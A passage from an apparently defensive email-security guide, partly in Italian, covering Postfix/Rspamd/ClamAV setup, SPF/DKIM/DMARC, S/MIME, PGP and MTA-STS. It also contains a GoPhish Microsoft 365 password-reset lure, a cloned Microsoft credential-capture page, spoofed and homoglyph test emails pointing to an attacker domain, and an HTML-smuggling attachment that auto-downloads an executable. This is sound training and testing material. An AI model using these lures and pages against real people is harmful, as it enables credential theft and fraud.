apt-get update && apt-get upgrade -y
apt-get install -y \
    postfix postfix-policyd-spf-python \
    clamav clamav-daemon \
    redis-server \
    certbot \
    dnsutils \
    opendkim opendkim-tools

# Install Rspamd from official repository
apt-get install -y lsb-release wget gpg
CODENAME=$(lsb_release -sc)
wget -qO- https://rspamd.com/apt-stable/gpg.key | gpg --dearmor > /usr/share/keyrings/rspamd.gpg
echo "deb [signed-by=/usr/share/keyrings/rspamd.gpg] http://rspamd.com/apt-stable/ ${CODENAME} main" \
    > /etc/apt/sources.list.d/rspamd.list
apt-get update
apt-get install -y rspamd

# Configure hostname
hostnamectl set-hostname "${HOSTNAME}"
echo "127.0.0.1 ${HOSTNAME}" >> /etc/hosts

# Obtain TLS certificate
certbot certonly --standalone -d "${HOSTNAME}" --agree-tos -m "${ADMIN_EMAIL}" --non-interactive

echo "[+] Base packages installed. Proceed to configuration."
```

#### Postfix Configuration

```bash
# /etc/postfix/main.cf
cat > /etc/postfix/main.cf << 'POSTFIX_MAIN'
# Basic settings
smtpd_banner = $myhostname ESMTP
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 3.6

# TLS
smtpd_tls_cert_file = /etc/letsencrypt/live/mail.lab.example.com/fullchain.pem
smtpd_tls_key_file = /etc/letsencrypt/live/mail.lab.example.com/privkey.pem
smtpd_tls_security_level = may
smtpd_tls_auth_only = yes
smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
smtpd_tls_mandatory_ciphers = high
smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache

smtp_tls_security_level = dane
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
smtp_dns_support_level = dnssec

# Network
myhostname = mail.lab.example.com
mydomain = lab.example.com
myorigin = $mydomain
mydestination = $myhostname, $mydomain, localhost.$mydomain, localhost
mynetworks = 127.0.0.0/8 [::1]/128
inet_interfaces = all
inet_protocols = all

# Restrictions
smtpd_helo_required = yes
disable_vrfy_command = yes
strict_rfc821_envelopes = yes

smtpd_recipient_restrictions =
    permit_mynetworks,
    permit_sasl_authenticated,
    reject_unauth_destination,
    reject_invalid_hostname,
    reject_non_fqdn_hostname,
    reject_non_fqdn_sender,
    reject_non_fqdn_recipient,
    reject_unknown_sender_domain,
    reject_unknown_recipient_domain,
    reject_rbl_client zen.spamhaus.org=127.0.0.[2..11],
    reject_rhsbl_sender dbl.spamhaus.org=127.0.1.[2..99],
    check_policy_service unix:private/policyd-spf,
    permit

smtpd_sender_restrictions =
    reject_non_fqdn_sender,
    reject_unknown_sender_domain

smtpd_relay_restrictions =
    permit_mynetworks,
    permit_sasl_authenticated,
    reject_unauth_destination

# Rate limiting
smtpd_client_connection_rate_limit = 30
smtpd_client_message_rate_limit = 60
smtpd_client_recipient_rate_limit = 200
anvil_rate_time_unit = 60s

# Size limits
message_size_limit = 26214400
mailbox_size_limit = 0

# Milter (Rspamd)
smtpd_milters = inet:localhost:11332
non_smtpd_milters = $smtpd_milters
milter_default_action = accept
milter_protocol = 6
milter_mail_macros = i {mail_addr} {client_addr} {client_name} {auth_authen}

# SPF policy daemon
policyd-spf_time_limit = 3600s
POSTFIX_MAIN

# /etc/postfix/master.cf additions for submission
cat >> /etc/postfix/master.cf << 'POSTFIX_MASTER'
submission inet n       -       y       -       -       smtpd
  -o syslog_name=postfix/submission
  -o smtpd_tls_security_level=encrypt
  -o smtpd_sasl_auth_enable=yes
  -o smtpd_tls_auth_only=yes
  -o smtpd_reject_unlisted_recipient=no
  -o smtpd_recipient_restrictions=permit_sasl_authenticated,reject
  -o milter_macro_daemon_name=ORIGINATING
POSTFIX_MASTER
```

#### Rspamd Configuration

```bash
# /etc/rspamd/local.d/worker-normal.inc
cat > /etc/rspamd/local.d/worker-normal.inc << 'EOF'
bind_socket = "localhost:11333";
EOF

# /etc/rspamd/local.d/worker-proxy.inc
cat > /etc/rspamd/local.d/worker-proxy.inc << 'EOF'
bind_socket = "localhost:11332";
milter = yes;
timeout = 120s;
upstream "local" {
    default = yes;
    self_scan = yes;
}
EOF

# /etc/rspamd/local.d/dkim_signing.conf
mkdir -p /var/lib/rspamd/dkim
cat > /etc/rspamd/local.d/dkim_signing.conf << 'EOF'
enabled = true;
path = "/var/lib/rspamd/dkim/$domain.$selector.key";
selector = "dkim202601";
allow_envfrom_empty = true;
allow_hdrfrom_mismatch = false;
sign_authenticated = true;
sign_local = true;
use_domain = "header";
use_esld = true;
key_size = 2048;
EOF

# Generate DKIM key
rspamadm dkim_keygen -s dkim202601 -d lab.example.com -k /var/lib/rspamd/dkim/lab.example.com.dkim202601.key > /var/lib/rspamd/dkim/lab.example.com.dkim202601.txt
chown -R _rspamd:_rspamd /var/lib/rspamd/dkim/

# /etc/rspamd/local.d/dmarc.conf
cat > /etc/rspamd/local.d/dmarc.conf << 'EOF'
enabled = true;
reporting = true;
send_reports = true;
report_domain = "lab.example.com";
report_org = "Lab Security";
actions = {
    quarantine = "add_header";
    reject = "reject";
};
EOF

# /etc/rspamd/local.d/antivirus.conf
cat > /etc/rspamd/local.d/antivirus.conf << 'EOF'
clamav {
    action = "reject";
    type = "clamav";
    servers = "127.0.0.1:3310";
    scan_mime_parts = true;
    scan_text_mime = true;
    scan_image_mime = false;
    max_size = 26214400;
    symbol = "CLAM_VIRUS";
    patterns {
        JUST_EICAR = "^Eicar-Test-Signature$";
    }
}
EOF

# /etc/rspamd/local.d/phishing.conf
cat > /etc/rspamd/local.d/phishing.conf << 'EOF'
enabled = true;
openphish_enabled = true;
phishtank_enabled = true;
EOF

# /etc/rspamd/local.d/mime_types.conf — Block dangerous attachments
cat > /etc/rspamd/local.d/mime_types.conf << 'EOF'
bad_extensions = {
    "scr" = 4;
    "lnk" = 4;
    "exe" = 4;
    "com" = 4;
    "bat" = 4;
    "cmd" = 4;
    "vbs" = 4;
    "vbe" = 4;
    "js"  = 4;
    "jse" = 4;
    "wsh" = 4;
    "wsf" = 4;
    "hta" = 4;
    "iso" = 3;
    "img" = 3;
    "vhd" = 3;
    "one" = 2;
};
bad_archive_extensions = {
    "scr" = 4;
    "lnk" = 4;
    "exe" = 3;
    "com" = 3;
    "bat" = 3;
    "cmd" = 3;
    "js"  = 3;
};
EOF

# /etc/rspamd/local.d/redis.conf
cat > /etc/rspamd/local.d/redis.conf << 'EOF'
servers = "127.0.0.1";
EOF
```

#### ClamAV Configuration

```bash
# Update virus definitions
freshclam

# /etc/clamav/clamd.conf adjustments
sed -i 's/^#TCPSocket .*/TCPSocket 3310/' /etc/clamav/clamd.conf
sed -i 's/^#TCPAddr .*/TCPAddr 127.0.0.1/' /etc/clamav/clamd.conf

# Enable and start services
systemctl enable --now redis-server
systemctl enable --now clamav-freshclam
systemctl enable --now clamav-daemon
systemctl enable --now rspamd
systemctl restart postfix
```

### 10.2 Configure SPF/DKIM/DMARC

#### DNS Records to Publish

```dns
; SPF record
lab.example.com.    IN  TXT  "v=spf1 ip4:203.0.113.10 a:mail.lab.example.com -all"

; DKIM record (public key from rspamadm output)
dkim202601._domainkey.lab.example.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."

; DMARC record — start with monitoring
_dmarc.lab.example.com.  IN  TXT  "v=DMARC1; p=none; sp=none; adkim=r; aspf=r; rua=mailto:dmarc-reports@lab.example.com; ruf=mailto:dmarc-forensic@lab.example.com; fo=1; pct=100"

; MTA-STS policy
_mta-sts.lab.example.com.  IN  TXT  "v=STSv1; id=20260507001"

; TLSRPT (TLS reporting)
_smtp._tls.lab.example.com.  IN  TXT  "v=TLSRPTv1; rua=mailto:tls-reports@lab.example.com"

; Reverse DNS (PTR) — configure through hosting provider
10.113.0.203.in-addr.arpa.  IN  PTR  mail.lab.example.com.
```

#### Verification

```bash
# Verify SPF
dig +short TXT lab.example.com | grep spf

# Verify DKIM
dig +short TXT dkim202601._domainkey.lab.example.com

# Verify DMARC
dig +short TXT _dmarc.lab.example.com

# Test email authentication (send to external test services)
# Use: mail-tester.com, mxtoolbox.com/deliverability, dkimvalidator.com

# Test DKIM signing locally
echo "Test message" | mail -s "DKIM Test" test@gmail.com
# Then check Gmail's "Show original" for Authentication-Results
```

### 10.3 GoPhish — Authorized Phishing Simulation Setup

#### Campaign Configuration

```bash
# Start GoPhish
cd /opt/gophish && ./gophish &

# API interaction for campaign setup
GOPHISH_API="https://127.0.0.1:3333/api"
API_KEY="your-api-key-here"

# Create sending profile
curl -k -X POST "${GOPHISH_API}/smtp/" \
    -H "Authorization: Bearer ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "name": "Lab SMTP Profile",
        "host": "mail.lab.example.com:587",
        "from_address": "IT Support <itsupport@lab.example.com>",
        "username": "gophish@lab.example.com",
        "password": "REDACTED",
        "ignore_cert_errors": false
    }'

# Create landing page (credential capture)
curl -k -X POST "${GOPHISH_API}/pages/" \
    -H "Authorization: Bearer ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "name": "Microsoft 365 Login",
        "html": "<html>...</html>",
        "capture_credentials": true,
        "capture_passwords": true,
        "redirect_url": "https://office.com"
    }'
```

#### GoPhish Email Template (Microsoft 365 Password Reset)

```html
<!-- GoPhish template — M365 password reset lure -->
<html>
<body style="font-family: 'Segoe UI', sans-serif; background: #f5f5f5; padding: 20px;">
<div style="max-width: 600px; margin: auto; background: white; border-radius: 4px; padding: 30px;">
    <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b" 
         alt="Microsoft" style="height: 24px; margin-bottom: 20px;">
    
    <h2 style="color: #1a1a1a; font-size: 20px;">Password Expiration Notice</h2>
    
    <p style="color: #333; line-height: 1.6;">
        Dear {{.FirstName}},
    </p>
    <p style="color: #333; line-height: 1.6;">
        Your organizational password for <b>{{.Email}}</b> will expire in 
        <b>24 hours</b>. To avoid account lockout, please update your password immediately.
    </p>
    
    <div style="text-align: center; margin: 30px 0;">
        <a href="{{.URL}}" style="background: #0078d4; color: white; padding: 12px 24px; 
           text-decoration: none; border-radius: 4px; font-size: 14px;">
            Update Password Now
        </a>
    </div>
    
    <p style="color: #666; font-size: 12px; line-height: 1.4;">
        If you did not request this change, please ignore this email. Your account 
        will continue to function normally until the password expires.
    </p>
    
    <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
    <p style="color: #999; font-size: 11px;">
        Microsoft Corporation, One Microsoft Way, Redmond, WA 98052
    </p>
</div>
</body>
</html>
```

#### GoPhish Landing Page (Credential Capture)

```html
<!-- Credential capture page — mimics M365 login -->
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; }
        .container { max-width: 440px; margin: 100px auto; background: white; 
                     padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
        input[type="email"], input[type="password"] { 
            width: 100%; padding: 8px 10px; margin: 8px 0 16px; 
            border: 1px solid #666; font-size: 15px; box-sizing: border-box; }
        .btn { background: #0067b8; color: white; border: none; 
               padding: 10px 20px; font-size: 15px; cursor: pointer; width: 100%; }
        .btn:hover { background: #005a9e; }
        .links { margin-top: 16px; font-size: 13px; }
        .links a { color: #0067b8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.svg" 
             class="logo" height="24">
        <h1>Sign in</h1>
        <form method="POST">
            <input type="email" name="username" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Sign in</button>
        </form>
        <div class="links">
            <a href="#">Forgot my password</a><br>
            <a href="#">Sign in with a security key</a>
        </div>
    </div>
</body>
</html>
```

### 10.4 Test Detection Rates

#### Methodology

```bash
#!/bin/bash
# test_detection.sh — Measure email security detection rates
# Requires: swaks (Swiss Army Knife for SMTP)

TARGET_DOMAIN="lab.example.com"
TARGET_USER="testuser@${TARGET_DOMAIN}"
RESULTS_FILE="/tmp/detection_results_$(date +%Y%m%d).csv"

echo "Test,Category,Delivered,Quarantined,Rejected" > "${RESULTS_FILE}"

# Test 1: Clean email (baseline — should deliver)
swaks --to "${TARGET_USER}" \
    --from "legitimate@partner.com" \
    --server mail.${TARGET_DOMAIN} \
    --header "Subject: Quarterly Report" \
    --body "Please find the quarterly report attached." \
    --tls

# Test 2: SPF fail (spoofed sender)
swaks --to "${TARGET_USER}" \
    --from "ceo@${TARGET_DOMAIN}" \
    --server mail.${TARGET_DOMAIN} \
    --header "Subject: Urgent Wire Transfer" \
    --body "Please process the attached invoice immediately." \
    --tls

# Test 3: Known phishing URL
swaks --to "${TARGET_USER}" \
    --from "support@microsoft-verify.com" \
    --server mail.${TARGET_DOMAIN} \
    --header "Subject: Account Verification Required" \
    --body "Click here to verify: http://malware.testing.google.test/testing/malware/" \
    --tls

# Test 4: EICAR test file (AV detection)
EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
echo "${EICAR}" > /tmp/eicar.txt
swaks --to "${TARGET_USER}" \
    --from "sender@external.com" \
    --server mail.${TARGET_DOMAIN} \
    --header "Subject: Document Attached" \
    --body "Please review the attached document." \
    --attach /tmp/eicar.txt \
    --tls
rm -f /tmp/eicar.txt

# Test 5: Homoglyph domain (Cyrillic 'a' in from domain)
# Note: requires Unicode-capable SMTP client
swaks --to "${TARGET_USER}" \
    --from "admin@lаb.example.com" \
    --server mail.${TARGET_DOMAIN} \
    --header "Subject: Password Reset Required" \
    --body "Your password has expired. Reset here: https://login-lab.attacker.com" \
    --tls

# Test 6: HTML smuggling attachment
cat > /tmp/smuggle.html << 'HTMLEOF'
<html><body><script>
var a=document.createElement('a');
a.href='data:application/octet-stream;base64,TVqQAAMAAAA==';
a.download='report.exe';a.click();
</script><p>Loading document...</p></body></html>
HTMLEOF
swaks --to "${TARGET_USER}" \
    --from "reports@external-vendor.com" \
    --server mail.${TARGET_DOMAIN} \
    --header "Subject: Monthly Report" \
    --header "Content-Type: multipart/mixed" \
    --attach /tmp/smuggle.html \
    --tls
rm -f /tmp/smuggle.html

echo "[+] Tests sent. Check mail logs and quarantine for results."
echo "[+] Compare against ${RESULTS_FILE}"
```

### 10.5 Analyze Bypasses

After running detection tests, analyze what was missed:

```bash
# Check Rspamd logs for scoring
journalctl -u rspamd --since "1 hour ago" | grep -E "score|action|symbol"

# Review Postfix logs for delivery/rejection
journalctl -u postfix --since "1 hour ago" | grep -E "reject|discard|hold|status=sent"

# Check Rspamd web interface for detailed scoring
# Default: http://localhost:11334/ (password in /etc/rspamd/local.d/worker-controller.inc)

# Export detection results
rspamc stat  # Overall statistics
rspamc counters  # Symbol hit counters
```

Common bypass scenarios to investigate:
- HTML smuggling delivered (no detonation capability in basic setup)
- Password-protected ZIP delivered (ClamAV cannot scan encrypted archives without password extraction)
- QR code phishing delivered (no QR decoder in default Rspamd)
- Legitimate-looking BEC with no malicious content delivered (pure social engineering)

### 10.6 Implement Additional Controls

Based on bypass analysis, layer additional controls:

```lua
-- /etc/rspamd/local.d/composites.conf — Custom scoring combinations
composites {
    HTML_SMUGGLING {
        expression = "MIME_HTML_ONLY & R_SUSPICIOUS_URL & FORGED_SENDER";
        score = 8.0;
        description = "Possible HTML smuggling attempt";
    };
    CREDENTIAL_PHISHING {
        expression = "PHISHING & (HAS_FORM_IN_HTML | R_SUSPICIOUS_URL) & !DMARC_POLICY_ALLOW";
        score = 10.0;
        description = "Credential phishing with form and suspicious URL";
    };
    BEC_INDICATOR {
        expression = "FORGED_SENDER & FROM_NAME_HAS_TITLE & ONCE_RECEIVED & !DKIM_VALID";
        score = 6.0;
        description = "Possible BEC — executive name spoofing";
    };
}
```

```lua
-- /etc/rspamd/local.d/multimap.conf — Custom blocklists and allowlists
SUSPICIOUS_TLD {
    type = "from";
    filter = "email:domain:tld";
    map = "/etc/rspamd/local.d/maps/suspicious_tlds.map";
    score = 3.0;
    description = "Email from suspicious TLD";
}

VIP_IMPERSONATION {
    type = "header";
    header = "from";
    filter = "email:name";
    map = "/etc/rspamd/local.d/maps/vip_names.map";
    score = 5.0;
    description = "External email using VIP display name";
    require_symbols = "!DMARC_POLICY_ALLOW";
}
```

```bash
# Create VIP name list
cat > /etc/rspamd/local.d/maps/vip_names.map << 'EOF'
/CEO Name/i
/CFO Name/i
/CTO Name/i
/COO Name/i
EOF

# Create suspicious TLD list
cat > /etc/rspamd/local.d/maps/suspicious_tlds.map << 'EOF'
top
xyz
click
link
buzz
rest
surf
icu
cam
EOF
```

### 10.7 Measure Improvement

#### Metrics Framework

Track these KPIs before and after each control implementation:

| Metric | Baseline Target | Post-Hardening Target |
|--------|----------------|----------------------|
| Phishing detection rate | > 90% | > 98% |
| Malware detection rate | > 95% | > 99.5% |
| BEC detection rate | > 60% | > 85% |
| False positive rate | < 0.5% | < 0.1% |
| Mean time to detect | < 5 min | < 1 min |
| Mean time to remediate | < 60 min | < 15 min |
| User report rate | baseline | +50% improvement |

#### Automated Reporting

```bash
#!/bin/bash
# weekly_email_security_report.sh
# Run via cron: 0 8 * * MON

REPORT_DATE=$(date -d "last week" +%Y-%m-%d)
REPORT_FILE="/var/log/email-security/weekly_report_${REPORT_DATE}.txt"

echo "=== Email Security Weekly Report ===" > "${REPORT_FILE}"
echo "Period: $(date -d 'last monday' +%Y-%m-%d) to $(date -d 'last sunday' +%Y-%m-%d)" >> "${REPORT_FILE}"
echo "" >> "${REPORT_FILE}"

# Total messages processed
TOTAL=$(rspamc stat | grep "Messages scanned:" | awk '{print $3}')
echo "Total messages scanned: ${TOTAL}" >> "${REPORT_FILE}"

# Actions taken
echo "" >> "${REPORT_FILE}"
echo "--- Actions ---" >> "${REPORT_FILE}"
rspamc stat | grep -E "^(Spam|Ham|Rejected|Greylist)" >> "${REPORT_FILE}"

# Top symbols triggered (threats detected)
echo "" >> "${REPORT_FILE}"
echo "--- Top 20 Threat Indicators ---" >> "${REPORT_FILE}"
rspamc counters | sort -t'|' -k3 -nr | head -20 >> "${REPORT_FILE}"

# ClamAV detections
echo "" >> "${REPORT_FILE}"
echo "--- Malware Detections ---" >> "${REPORT_FILE}"
grep -c "FOUND" /var/log/clamav/clamav.log 2>/dev/null || echo "0 detections" >> "${REPORT_FILE}"

echo "" >> "${REPORT_FILE}"
echo "Report generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "${REPORT_FILE}"

# Email report to security team
mail -s "Weekly Email Security Report - ${REPORT_DATE}" secops@lab.example.com < "${REPORT_FILE}"
```

#### Continuous Improvement Cycle

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Monitor   │───▶│   Analyze   │───▶│  Implement  │───▶│   Verify    │
│  (Metrics)  │    │  (Gaps)     │    │  (Controls) │    │  (Test)     │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
       ▲                                                         │
       └─────────────────────────────────────────────────────────┘
```

1. **Monitor:** Collect detection metrics, user reports, false positives
2. **Analyze:** Identify gaps — what bypassed controls? What generated false positives?
3. **Implement:** Add or tune rules, update maps, adjust scoring thresholds
4. **Verify:** Re-run test suite, validate improvement, confirm no regression

---

## 11. Crittografia Email — S/MIME e PGP

### 11.1 Panoramica della Crittografia Email

La crittografia email garantisce la riservatezza e l'integrità delle comunicazioni elettroniche. In un contesto enterprise moderno (2025-2026), la crittografia email opera su tre livelli distinti che devono essere compresi e gestiti separatamente:

**Crittografia in transito (TLS):** Protegge il messaggio durante il trasferimento tra server MTA. STARTTLS su porta 25 è opportunistico — un attaccante man-in-the-middle può eseguire un attacco STRIPTLS rimuovendo l'offerta TLS. MTA-STS e DANE (trattati nella sezione 12) risolvono questo problema forzando l'uso di TLS con validazione del certificato.

**Crittografia end-to-end (S/MIME, PGP/GPG):** Il messaggio viene cifrato sul dispositivo del mittente e decifrato solo sul dispositivo del destinatario. Nessun server intermedio può leggere il contenuto. Questo è l'unico livello che garantisce riservatezza vera contro compromissione del server mail.

**Crittografia at-rest:** I messaggi sono cifrati nel mail store (database Exchange, Maildir, Google Vault). Protegge contro accesso non autorizzato allo storage ma non contro accesso da parte dell'amministratore del sistema mail.

### 11.2 S/MIME — Secure/Multipurpose Internet Mail Extensions

S/MIME (definito da RFC 8551) è lo standard enterprise per la crittografia e la firma digitale delle email. Utilizza certificati X.509 emessi da Certificate Authority (CA) riconosciute, integrandosi nativamente con l'infrastruttura PKI aziendale.

#### Funzionalità S/MIME

**Firma digitale:** Garantisce autenticità del mittente e integrità del messaggio. Il mittente firma il messaggio con la propria chiave privata; il destinatario verifica la firma usando il certificato pubblico del mittente. La firma copre headers selezionati e il body completo del messaggio.

**Crittografia:** Il messaggio viene cifrato con la chiave pubblica del destinatario (estratta dal suo certificato S/MIME). Solo il destinatario, possedendo la chiave privata corrispondente, può decifrare il contenuto. L'algoritmo di cifratura simmetrico (AES-256-CBC o AES-256-GCM) viene utilizzato per il contenuto, mentre la chiave simmetrica viene cifrata con la chiave pubblica RSA o ECDSA del destinatario.

**Firma + Crittografia combinata:** Il messaggio viene prima firmato e poi cifrato (sign-then-encrypt), garantendo sia autenticità che riservatezza.

#### Architettura PKI per S/MIME Enterprise

```
┌──────────────────────────────────────────────────────────────┐
│                    Root CA (Offline)                           │
│          Certificato radice, validità 20+ anni               │
│          Chiave privata in HSM, air-gapped                   │
├──────────────────────────────────────────────────────────────┤
│              Issuing CA (Online, Automatizzata)               │
│          Emette certificati S/MIME per utenti                │
│          Integrata con Active Directory / Azure AD           │
│          CRL e OCSP responder attivi                         │
├──────────────────────────────────────────────────────────────┤
│                 Certificati Utente S/MIME                     │
│          Uno per utente, validità 1-2 anni                   │
│          Key usage: digitalSignature, keyEncipherment        │
│          Extended key usage: emailProtection                 │
│          Subject Alternative Name: email address             │
└──────────────────────────────────────────────────────────────┘
```

#### Deployment S/MIME in Microsoft 365

```powershell
# Configurazione S/MIME per l'organizzazione
Set-SmimeConfig -OWAAllowUserChoiceOfSigningCertificate $true
Set-SmimeConfig -OWACheckCRLOnSend $true
Set-SmimeConfig -OWADLExpansionTimeout 10000
Set-SmimeConfig -OWAEncryptionAlgorithms "AES256-CBC"
Set-SmimeConfig -OWASigningAlgorithms "SHA256"
Set-SmimeConfig -OWAForceSMIMEClientUpgrade $true
Set-SmimeConfig -OWAAlwaysEncrypt $false
Set-SmimeConfig -OWAAlwaysSign $true
Set-SmimeConfig -OWATripleWrapSignedEncryptedMail $true

# Abilitazione S/MIME per un singolo utente
Set-Mailbox -Identity "utente@example.com" `
    -SmimeEncryptByDefault $true `
    -SmimeSignByDefault $true

# Pubblicazione certificato utente in GAL (Global Address List)
# Il certificato pubblico deve essere disponibile per i colleghi
Set-Mailbox -Identity "utente@example.com" `
    -UserCertificate @{Add=[System.Convert]::FromBase64String("MIID...")}

# Verifica configurazione S/MIME
Get-SmimeConfig | Format-List *

# Transport rule per forzare crittografia S/MIME verso partner
New-TransportRule -Name "Encrypt to Partner Corp" `
    -SentTo "partner.com" `
    -ApplyRightsProtectionTemplate "Encrypt" `
    -SentToScope "NotInOrganization"
```

#### Gestione Ciclo di Vita Certificati S/MIME

La gestione dei certificati S/MIME richiede processi automatizzati per evitare interruzioni:

**Emissione automatica:** Integrazione con Microsoft Certificate Services (AD CS) o CA cloud-based (DigiCert, Sectigo, GlobalSign) per emissione automatica al provisioning dell'utente. Il certificato viene distribuito tramite Intune MDM o Group Policy.

**Rinnovo proattivo:** I certificati devono essere rinnovati 30-60 giorni prima della scadenza. Un certificato scaduto impedisce la decifrazione di nuovi messaggi e causa errori di validazione della firma.

**Revoca:** In caso di compromissione della chiave privata o di cessazione del rapporto lavorativo, il certificato deve essere revocato immediatamente tramite CRL (Certificate Revocation List) o OCSP (Online Certificate Status Protocol).

**Key escrow:** Le chiavi di crittografia (non quelle di firma) devono essere archiviate centralmente (key escrow) per consentire il recupero di messaggi cifrati in caso di perdita della chiave privata dell'utente o di requisiti legali di accesso.

### 11.3 PGP/GPG — Pretty Good Privacy

PGP (e la sua implementazione open-source GnuPG/GPG) utilizza un modello di fiducia decentralizzato (Web of Trust) invece di un'autorità di certificazione centralizzata. Ogni utente genera la propria coppia di chiavi e pubblica la chiave pubblica su keyserver o la distribuisce direttamente.

#### Generazione Chiavi GPG

```bash
# Generazione chiave GPG con algoritmo moderno
gpg --full-generate-key --expert

# Opzione raccomandata 2025+: Ed25519 per firma, Curve25519 per cifratura
# Tipo: (9) ECC e ECC
# Curva: (1) Curve 25519
# Validità: 2y (2 anni, con rinnovo)

# Generazione non interattiva per automazione
gpg --batch --gen-key <<EOF
%no-protection
Key-Type: eddsa
Key-Curve: Ed25519
Key-Usage: sign
Subkey-Type: ecdh
Subkey-Curve: Curve25519
Subkey-Usage: encrypt
Name-Real: Mario Rossi
Name-Email: mario.rossi@example.com
Expire-Date: 2y
%commit
EOF

# Esportazione chiave pubblica
gpg --armor --export mario.rossi@example.com > mario_rossi_pub.asc

# Pubblicazione su keyserver
gpg --keyserver hkps://keys.openpgp.org --send-keys <KEY-ID>

# Importazione chiave pubblica di un contatto
gpg --import contatto_pub.asc

# Cifratura di un messaggio
gpg --encrypt --armor --recipient destinatario@example.com messaggio.txt

# Firma e cifratura combinata
gpg --sign --encrypt --armor --recipient destinatario@example.com messaggio.txt

# Verifica firma
gpg --verify messaggio.txt.asc
```

#### S/MIME vs PGP — Confronto Operativo

| Caratteristica | S/MIME | PGP/GPG |
|----------------|--------|---------|
| Modello di fiducia | Gerarchico (PKI/CA) | Decentralizzato (Web of Trust) |
| Gestione chiavi | Centralizzata, automatizzabile | Manuale, responsabilità utente |
| Integrazione client | Nativa in Outlook, Apple Mail, Thunderbird | Richiede plugin (Gpg4win, GPGTools) |
| Costo | Certificati commerciali (~$10-40/utente/anno) | Gratuito (open-source) |
| Scalabilità enterprise | Eccellente con ADCS/Intune | Complessa oltre 50 utenti |
| Conformità normativa | Preferito per audit e compliance | Accettato ma meno tracciabile |
| Revoca certificati | CRL/OCSP standardizzati | Revoca keyserver, meno affidabile |
| Supporto mobile | Nativo iOS/Android con MDM | Limitato, richiede app terze parti |
| Caso d'uso ideale | Enterprise, comunicazioni regolamentate | Team tecnici, giornalismo, privacy |

#### Raccomandazioni Strategiche per la Crittografia Email

**Approccio stratificato (consigliato per enterprise 2025-2026):**

1. **TLS come baseline universale:** Tutti i server devono supportare TLS 1.2+ con enforcement tramite MTA-STS
2. **S/MIME per comunicazioni regolamentate:** Dati sanitari (HIPAA), finanziari (PCI DSS, GDPR), legali
3. **Office Message Encryption (OME) per semplicità:** Quando il destinatario non ha S/MIME, OME fornisce crittografia tramite portale web senza richiedere certificati al destinatario
4. **PGP per nicchie specifiche:** Team di sicurezza, comunicazioni con ricercatori, whistleblowing
5. **Sensitivity Labels per classificazione:** Microsoft Purview Information Protection per applicare automaticamente crittografia basata sulla classificazione del contenuto

---

## 12. Transport Layer Security — MTA-STS e DANE

### 12.1 Il Problema del TLS Opportunistico

STARTTLS (RFC 3207) è intrinsecamente vulnerabile perché è opportunistico — il server annuncia il supporto TLS in cleartext durante l'handshake SMTP, e un attaccante man-in-the-middle può semplicemente rimuovere l'annuncio (STRIPTLS attack), forzando la comunicazione in chiaro. Questo compromette la riservatezza del trasporto senza che mittente o destinatario ricevano alcun avviso.

Nel 2025-2026, due standard complementari risolvono questo problema: MTA-STS e DANE. Entrambi forzano l'uso di TLS con validazione del certificato, ma utilizzano meccanismi diversi.

### 12.2 MTA-STS — Mail Transfer Agent Strict Transport Security

MTA-STS (RFC 8461) consente al dominio destinatario di dichiarare che il proprio server mail supporta TLS e che i server mittenti devono rifiutarsi di consegnare messaggi se non è possibile stabilire una connessione TLS autenticata. La policy viene pubblicata tramite HTTPS (non DNS), il che lo rende resistente a spoofing DNS senza richiedere DNSSEC.

#### Componenti MTA-STS

**Record DNS TXT:** Annuncia l'esistenza della policy MTA-STS e il suo identificativo di versione.

```dns
_mta-sts.example.com.  IN  TXT  "v=STSv1; id=20260524001"
```

L'`id` deve essere aggiornato ogni volta che la policy cambia, forzando i server mittenti a scaricare la nuova versione.

**Policy file HTTPS:** La policy viene servita all'URL `https://mta-sts.example.com/.well-known/mta-sts.txt`:

```
version: STSv1
mode: enforce
mx: mail.example.com
mx: mail2.example.com
mx: *.example.com
max_age: 604800
```

**Modalità della policy:**

| Modalità | Comportamento | Uso |
|----------|--------------|-----|
| `testing` | Riporta errori ma consegna comunque | Fase iniziale, 2-4 settimane |
| `enforce` | Rifiuta consegna se TLS fallisce | Produzione |
| `none` | Nessun enforcement | Disabilitazione policy |

#### Deployment MTA-STS — Guida Passo per Passo

```bash
# 1. Configurare web server per mta-sts.example.com
# Deve rispondere su HTTPS con certificato valido

# Nginx configuration
cat > /etc/nginx/sites-available/mta-sts << 'EOF'
server {
    listen 443 ssl http2;
    server_name mta-sts.example.com;
    
    ssl_certificate /etc/letsencrypt/live/mta-sts.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/mta-sts.example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    
    location /.well-known/mta-sts.txt {
        default_type text/plain;
        alias /var/www/mta-sts/.well-known/mta-sts.txt;
    }
    
    # Bloccare tutto il resto
    location / {
        return 404;
    }
}
EOF

# 2. Creare il file policy
mkdir -p /var/www/mta-sts/.well-known
cat > /var/www/mta-sts/.well-known/mta-sts.txt << 'EOF'
version: STSv1
mode: testing
mx: mail.example.com
mx: mail2.example.com
max_age: 604800
EOF

# 3. Pubblicare record DNS
